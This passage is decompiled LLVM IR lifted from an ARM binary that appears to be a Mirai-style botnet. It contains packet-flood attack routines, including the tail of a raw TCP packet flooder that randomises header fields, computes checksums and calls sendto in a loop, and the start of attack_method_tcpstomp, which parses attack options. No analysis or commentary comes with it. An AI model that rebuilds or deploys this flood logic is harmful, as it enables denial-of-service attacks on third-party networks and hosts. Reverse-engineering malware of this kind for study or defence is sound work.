  %v2_b140 = inttoptr i32 %v1_b140 to i8*
  %v3_b140 = load i8, i8* %v2_b140, align 1
  %v4_b140 = zext i8 %v3_b140 to i32
  store i32 %v1_b144, i32* %r3.global-to-local, align 4
  %v1_b148 = and i32 %v4_b140, 239
  %v5_b14c = or i32 %v1_b148, %v4_b14c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = trunc i32 %v5_b14c to i8
  store i8 %v1_b150, i8* %v2_b140, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b158 = load i32, i32* @r8, align 4
  %v1_b158 = add i32 %v0_b158, 13
  %v2_b158 = inttoptr i32 %v1_b158 to i8*
  %v3_b158 = load i8, i8* %v2_b158, align 1
  %v4_b158 = zext i8 %v3_b158 to i32
  store i32 %v1_b15c, i32* %r2.global-to-local, align 4
  %v1_b160 = and i32 %v4_b158, 247
  %v5_b164 = or i32 %v1_b160, %v4_b164
  store i32 %v5_b164, i32* %r3.global-to-local, align 4
  %v1_b168 = trunc i32 %v5_b164 to i8
  store i8 %v1_b168, i8* %v2_b158, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b170 = load i32, i32* @r8, align 4
  %v1_b170 = add i32 %v0_b170, 13
  %v2_b170 = inttoptr i32 %v1_b170 to i8*
  %v3_b170 = load i8, i8* %v2_b170, align 1
  %v4_b170 = zext i8 %v3_b170 to i32
  store i32 %v1_b174, i32* %r3.global-to-local, align 4
  %v1_b178 = and i32 %v4_b170, 251
  %v5_b17c = or i32 %v1_b178, %v4_b17c
  store i32 %v5_b17c, i32* %r2.global-to-local, align 4
  %v1_b180 = trunc i32 %v5_b17c to i8
  store i8 %v1_b180, i8* %v2_b170, align 1
  store i32 %v1_ace4, i32* %r1.global-to-local, align 4
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = add i32 %v0_b188, 13
  %v2_b188 = inttoptr i32 %v1_b188 to i8*
  %v3_b188 = load i8, i8* %v2_b188, align 1
  %v4_b188 = zext i8 %v3_b188 to i32
  store i32 %v1_b18c, i32* %r2.global-to-local, align 4
  %v1_b190 = and i32 %v4_b188, 253
  %v4_b194 = or i32 %v1_b190, %v3_b194
  store i32 %v4_b194, i32* %r3.global-to-local, align 4
  %v1_b198 = trunc i32 %v4_b194 to i8
  store i8 %v1_b198, i8* %v2_b188, align 1
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  %v0_b1a0 = load i32, i32* @r8, align 4
  %v1_b1a0 = add i32 %v0_b1a0, 13
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i8*
  %v3_b1a0 = load i8, i8* %v2_b1a0, align 1
  %v4_b1a0 = zext i8 %v3_b1a0 to i32
  %v1_b1a8 = and i32 %v4_b1a0, 254
  store i32 %v1_b1a8, i32* %r2.global-to-local, align 4
  %v2_b1ac = or i32 %v1_b1a8, %v1_b1a4
  store i32 %v2_b1ac, i32* %r3.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v2_b1ac to i8
  store i8 %v1_b1b0, i8* %v2_b1a0, align 1
  %v3_b1b4 = load i32, i32* @r8, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 14
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v1_b120, i16* %v5_b1b4, align 2
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v0_b1bc = load i32, i32* @r4, align 4
  %v1_b1bc = add i32 %v0_b1bc, 40
  store i32 %v1_b1bc, i32* %r0.global-to-local, align 4
  %v2_b1c0 = inttoptr i32 %v1_b1bc to i16*
  %v3_b1c0 = call i32 @rand_str(i16* %v2_b1c0, i32 %v6_ad1c)
  store i32 %v3_b1c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af14

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_ad88
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_ad1c, 40
  br label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_af28, %dec_label_pc_b1c8
  %storemerge6.pre-phi = phi i32 [ %v1_b018, %dec_label_pc_af28 ], [ %.pre, %dec_label_pc_b1c8 ]
  %v0_b1ec26 = phi i32 [ %v1_af1c, %dec_label_pc_af28 ], [ 0, %dec_label_pc_b1c8 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_ad1c, 65536
  %storemerge = add i32 %v6_ad1c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b1d8 = add i32 %storemerge4, 1310720
  store i32 %v1_b1d8, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b1d8, 256
  %v3_b1e0 = and i32 %tmp83, 65280
  store i32 %v3_b1e0, i32* %r3.global-to-local, align 4
  %v4_b1e4 = udiv i32 %v1_b1d8, 16777216
  %v5_b1e4 = or i32 %v3_b1e0, %v4_b1e4
  store i32 %v5_b1e4, i32* @r8, align 4
  %v2_b310 = icmp eq i32 %v1_ad3c, 0
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4, %dec_label_pc_b1d8
  %v0_b1ec = phi i32 [ %v0_b1ec26, %dec_label_pc_b1d8 ], [ 0, %dec_label_pc_b2f4 ], [ 0, %dec_label_pc_b1e8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ec = icmp eq i32 %v0_b1ec, 0
  store i1 %v2_b1ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ec, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1fc

dec_label_pc_b1fc:                                ; preds = %dec_label_pc_b224, %dec_label_pc_b1f8
  %v1_b204 = phi i32 [ %v1_b2e4, %dec_label_pc_b224 ], [ 0, %dec_label_pc_b1f8 ]
  store i32 %v2_aba8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b204 = mul i32 %v1_b204, 4
  %v5_b204 = add i32 %v4_b204, %v2_aba8
  %v6_b204 = inttoptr i32 %v5_b204 to i32*
  %v7_b204 = load i32, i32* %v6_b204, align 4
  store i32 %v7_b204, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b20c = load i32, i32* @fp, align 4
  %v9_b20c = icmp eq i32 %v0_b20c, 65535
  store i1 %v9_b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_b210 = add i32 %v7_b204, 20
  store i32 %v1_b210, i32* @r5, align 4
  br i1 %v9_b20c, label %dec_label_pc_b308, label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %dec_label_pc_b1fc
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b31c

dec_label_pc_b224:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b308, %dec_label_pc_b31c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b228 = load i32, i32* @r4, align 4
  %v3_b228 = add i32 %v2_b228, 10
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b230 = load i32, i32* @r4, align 4
  store i32 %v0_b230, i32* @r0, align 4
  %v2_b234 = call i32 @checksum_generic(i32 %v0_b230, i32 20)
  %v3_b234 = trunc i32 %v2_b234 to i16
  store i32 %v2_b234, i32* %r0.global-to-local, align 4
  %v3_b238 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab98, i32* %r2.global-to-local, align 4
  %v3_b240 = mul i32 %v3_b238, 16
  %v2_b244 = add i32 %v3_b240, %v2_ab98
  store i32 %v2_b244, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b244, 4
  %v2_b248 = inttoptr i32 %v1_b248 to i32*
  %v3_b248 = load i32, i32* %v2_b248, align 4
  %v3_b24c = mul i32 %v3_b248, 65536
  store i32 %v3_b24c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b248, 256
  %v1_b254 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b248, 256
  %v4_b258 = urem i32 %tmp86, 256
  %v5_b258 = or i32 %v4_b258, %v1_b254
  store i32 %v5_b258, i32* %r3.global-to-local, align 4
  %v1_b25c = add i32 %v3_b248, 1
  store i32 %v1_b25c, i32* %r2.global-to-local, align 4
  store i32 %v1_b25c, i32* %v2_b248, align 4
  %v0_b264 = load i32, i32* %r3.global-to-local, align 4
  %v1_b264 = load i32, i32* @r5, align 4
  %v2_b264 = add i32 %v1_b264, 4
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v0_b264, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r1.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 8
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  %tmp87 = mul i32 %v3_b268, 256
  %v1_b274 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b268, 256
  %v4_b278 = urem i32 %tmp88, 256
  %v5_b278 = or i32 %v4_b278, %v1_b274
  %v1_b27c = load i32, i32* @r5, align 4
  %v2_b27c = add i32 %v1_b27c, 8
  %v3_b27c = inttoptr i32 %v2_b27c to i32*
  store i32 %v5_b278, i32* %v3_b27c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b284 = load i32, i32* @r4, align 4
  %v4_b284 = add i32 %v3_b284, 10
  %v5_b284 = inttoptr i32 %v4_b284 to i16*
  store i16 %v3_b234, i16* %v5_b284, align 2
  %v0_b288 = load i32, i32* @r5, align 4
  store i32 %v0_b288, i32* @r1, align 4
  %v0_b28c = load i32, i32* %r3.global-to-local, align 4
  %v1_b28c = trunc i32 %v0_b28c to i16
  %v3_b28c = add i32 %v0_b288, 16
  %v4_b28c = inttoptr i32 %v3_b28c to i16*
  store i16 %v1_b28c, i16* %v4_b28c, align 2
  %v0_b290 = load i32, i32* @r8, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @sl, align 4
  store i32 %v0_b294, i32* %r3.global-to-local, align 4
  %v0_b298 = load i32, i32* @r4, align 4
  store i32 %v0_b298, i32* %r0.global-to-local, align 4
  %v4_b29c = call i32 @checksum_tcpudp(i32 %v0_b298, i32 %v0_b288, i32 %v0_b290, i32 %v0_b294)
  %v5_b29c = trunc i32 %v4_b29c to i16
  store i32 %v4_b29c, i32* %r0.global-to-local, align 4
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b2a8 = mul i32 %v3_b2a0, 32
  store i32 %v3_b2a8, i32* %lr.global-to-local, align 4
  %v3_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = add i32 %v3_b2ac, 16
  %v5_b2ac = inttoptr i32 %v4_b2ac to i16*
  store i16 %v5_b29c, i16* %v5_b2ac, align 2
  %v0_b2b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b2b0, -8
  %v5_b2b0 = add i32 %v0_b2b0, %tmp105
  store i32 %v5_b2b0, i32* %lr.global-to-local, align 4
  %v0_b2b4 = load i32, i32* @r5, align 4
  %v1_b2b4 = add i32 %v0_b2b4, 2
  %v2_b2b4 = inttoptr i32 %v1_b2b4 to i16*
  %v3_b2b4 = load i16, i16* %v2_b2b4, align 2
  %v4_b2b4 = zext i16 %v3_b2b4 to i32
  store i32 %v4_b2b4, i32* @r5, align 4
  %v1_b2b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b2b8 = add i32 %v1_b2b8, %v5_b2b0
  store i32 %v2_b2b8, i32* @lr, align 4
  %v3_b2bc = add i32 %v2_b2b8, 2
  %v4_b2bc = inttoptr i32 %v3_b2bc to i16*
  store i16 %v3_b2b4, i16* %v4_b2bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r4, align 4
  store i32 %v0_b2c8, i32* %r1.global-to-local, align 4
  %v0_b2cc = load i32, i32* @sb, align 4
  store i32 %v0_b2cc, i32* %r0.global-to-local, align 4
  %v0_b2d0 = load i32, i32* @r7, align 4
  store i32 %v0_b2d0, i32* %r2.global-to-local, align 4
  %v0_b2d4 = load i32, i32* @lr, align 4
  %v6_b2dc = call i32 @__libc_sendto(i32 %v0_b2cc, i32 %v0_b2c8, i32 %v0_b2d0, i32 16384, i32 %v0_b2d4, i32 16)
  %v3_b2e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = add i32 %v3_b2e0, 1
  store i32 %v1_b2e4, i32* %r0.global-to-local, align 4
  %v0_b2e8 = load i32, i32* @r6, align 4
  %v9_b2e8 = icmp eq i32 %v0_b2e8, %v1_b2e4
  store i1 %v9_b2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2e4, i32* %stack_var_-44, align 4
  %v8_b2f0 = icmp sgt i32 %v0_b2e8, %v1_b2e4
  br i1 %v8_b2f0, label %dec_label_pc_b1fc, label %dec_label_pc_b2f4

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b224
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2f8 = icmp eq i32 %v0_b2e8, 0
  store i1 %v2_b2f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2f8, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b308:                                ; preds = %dec_label_pc_b1fc
  %v0_b308 = call i32 @rand_next()
  %v1_b308 = trunc i32 %v0_b308 to i16
  store i32 %v0_b308, i32* %r0.global-to-local, align 4
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  %v3_b314 = load i32, i32* @r4, align 4
  %v4_b314 = add i32 %v3_b314, 4
  %v5_b314 = inttoptr i32 %v4_b314 to i16*
  store i16 %v1_b308, i16* %v5_b314, align 2
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b308.dec_label_pc_b31c_crit_edge

dec_label_pc_b308.dec_label_pc_b31c_crit_edge:    ; preds = %dec_label_pc_b308
  %v0_b31c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b308.dec_label_pc_b31c_crit_edge, %dec_label_pc_b218
  %v0_b31c = phi i32 [ %v0_b31c.pre, %dec_label_pc_b308.dec_label_pc_b31c_crit_edge ], [ %v7_b204, %dec_label_pc_b218 ]
  %v1_b31c = add i32 %v0_b31c, 40
  store i32 %v1_b31c, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v2_b324 = inttoptr i32 %v1_b31c to i16*
  %v3_b324 = call i32 @rand_str(i16* %v2_b324, i32 %v6_ad1c)
  store i32 %v3_b324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b224

; uselistorder directives
  uselistorder i32 %v0_b308, { 1, 0 }
  uselistorder i32 %v1_b2e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b2b0, { 1, 0 }
  uselistorder i32 %v4_b29c, { 1, 0 }
  uselistorder i32 %v3_b268, { 1, 0 }
  uselistorder i32 %v3_b248, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b234, { 1, 0 }
  uselistorder i1 %v2_b310, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b120, { 1, 0 }
  uselistorder i32 %v0_b058, { 1, 0 }
  uselistorder i32 %v5_afec, { 1, 0 }
  uselistorder i32 %v0_afac, { 1, 0 }
  uselistorder i32 %v0_af68, { 1, 2, 0, 3 }
  uselistorder i32 %v1_af18, { 1, 0, 2, 3 }
  uselistorder i32 %v3_af04, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae90, { 1, 0 }
  uselistorder i32 %v6_ae88, { 0, 2, 1, 3 }
  uselistorder i1 %v9_aeb8, { 1, 0 }
  uselistorder i32 %v4_aecc, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ae14, { 1, 0, 2 }
  uselistorder i32 %v0_afc4, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i1 %v7_adfc, { 1, 0, 2 }
  uselistorder i1 %v7_adb0, { 1, 0 }
  uselistorder i32 %v3_adac, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b18c, { 1, 0 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v1_b15c, { 1, 0 }
  uselistorder i32 %v1_b144, { 1, 0 }
  uselistorder i32 %v1_b12c, { 1, 0 }
  uselistorder i32 %v3_aec4, { 1, 0 }
  uselistorder i1 %v2_aee0, { 1, 0 }
  uselistorder i32 %v1_aedc, { 1, 0 }
  uselistorder i32 %v4_aed8, { 2, 0, 1 }
  uselistorder i32 %v2_adec, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad88, { 1, 0 }
  uselistorder i1 %v7_ad80, { 1, 0 }
  uselistorder i1 %v7_ad54, { 1, 0 }
  uselistorder i32 %v3_ad50, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_ad3c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_ad1c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_ad04, { 1, 0 }
  uselistorder i32 %v1_ace4, { 1, 0 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v6_ac40, { 1, 0 }
  uselistorder i32 %v1_ac28, { 1, 0 }
  uselistorder i8 %v5_abe0, { 1, 0 }
  uselistorder i32 %v6_abc0, { 1, 0 }
  uselistorder i32 %v2_aba8, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab98, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b224, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f8, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d8, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae50, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_adbc, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
}

define i32 @attack_method_tcpstomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b330 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b34c = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b358 = load i32, i32* @r6, align 4
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  %v2_b35c = call i32 @calloc(i32 %v0_b358, i32 4)
  %v0_b360 = load i32, i32* @r5, align 4
  store i32 %v0_b360, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b370 = load i32, i32* @r4, align 4
  store i32 %v0_b370, i32* %r0.global-to-local, align 4
  %v5_b374 = inttoptr i32 %v0_b360 to i32*
  %v6_b374 = call i32 @attack_get_opt_int(i32 %v0_b370, i32* %v5_b374, i32 2, i32 0)
  %v1_b380 = urem i32 %v6_b374, 256
  store i32 %v1_b380, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b38c = load i32, i32* @r5, align 4
  store i32 %v0_b38c, i32* %r1.global-to-local, align 4
  %v0_b390 = load i32, i32* @r4, align 4
  store i32 %v0_b390, i32* %r0.global-to-local, align 4
  %v5_b394 = trunc i32 %v6_b374 to i8
  %v6_b398 = inttoptr i32 %v0_b38c to i32*
  %v7_b398 = call i32 @attack_get_opt_int(i32 %v0_b390, i32* %v6_b398, i32 3, i32 65535)
  %v0_b39c = load i32, i32* @r5, align 4
  store i32 %v0_b39c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b398, i32* @r7, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v4_b3b0 = inttoptr i32 %v0_b39c to i32*
  %v5_b3b0 = call i32 @attack_get_opt_int(i32 %v0_b3ac, i32* %v4_b3b0, i32 4, i32 64)
  %v1_b3b8 = urem i32 %v5_b3b0, 256
  store i32 %v1_b3b8, i32* %ip.global-to-local, align 4
  %v0_b3bc = load i32, i32* @r5, align 4
  store i32 %v0_b3bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v6_b3d0 = inttoptr i32 %v0_b3bc to i32*
  %v7_b3d0 = call i32 @attack_get_opt_int(i32 %v0_b3c8, i32* %v6_b3d0, i32 5, i32 1)
  %v1_b3dc = urem i32 %v7_b3d0, 256
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ec = load i32, i32* @r4, align 4
  store i32 %v0_b3ec, i32* %r0.global-to-local, align 4
  %v5_b3f4 = inttoptr i32 %v0_b3e4 to i32*
  %v6_b3f4 = call i32 @attack_get_opt_int(i32 %v0_b3ec, i32* %v5_b3f4, i32 7, i32 65535)
  %v0_b3f8 = load i32, i32* @r5, align 4
  store i32 %v0_b3f8, i32* %r1.global-to-local, align 4
  %v3_b3fc = mul i32 %v6_b3f4, 65536
  store i32 %v3_b3fc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v3_b40c = urem i32 %v6_b3f4, 65536
  store i32 %v3_b40c, i32* @sl, align 4
  %v4_b410 = inttoptr i32 %v0_b3f8 to i32*
  %v5_b410 = call i32 @attack_get_opt_int(i32 %v0_b408, i32* %v4_b410, i32 11, i32 0)
  %v1_b418 = urem i32 %v5_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @attack_get_opt_int(i32 %v0_b428, i32* %v5_b430, i32 12, i32 1)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @attack_get_opt_int(i32 %v0_b448, i32* %v5_b450, i32 13, i32 1)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @attack_get_opt_int(i32 %v0_b468, i32* %v5_b470, i32 14, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b490 = inttoptr i32 %v0_b47c to i32*
  %v6_b490 = call i32 @attack_get_opt_int(i32 %v0_b488, i32* %v5_b490, i32 15, i32 0)
  %v1_b498 = urem i32 %v6_b490, 256
  store i32 %v1_b498, i32* %ip.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4a8 = load i32, i32* @r4, align 4
